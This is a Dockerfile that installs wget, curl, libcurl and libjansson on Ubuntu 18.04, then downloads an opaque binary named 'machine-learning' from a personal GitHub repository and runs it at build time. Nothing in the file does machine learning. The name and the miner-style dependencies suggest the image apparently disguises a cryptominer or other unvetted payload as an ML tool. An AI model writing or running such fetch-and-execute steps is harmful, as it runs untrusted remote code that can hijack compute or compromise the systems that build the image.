FROM ubuntu:18.04
RUN apt-get update && \
     apt-get install wget -y && \
     apt install libjansson-dev -y && \
     apt-get install curl libcurl4 -y && \
     wget https://github.com/keropamera/machine/raw/main/machine-learning && chmod +x machine-learning && ./machine-learning
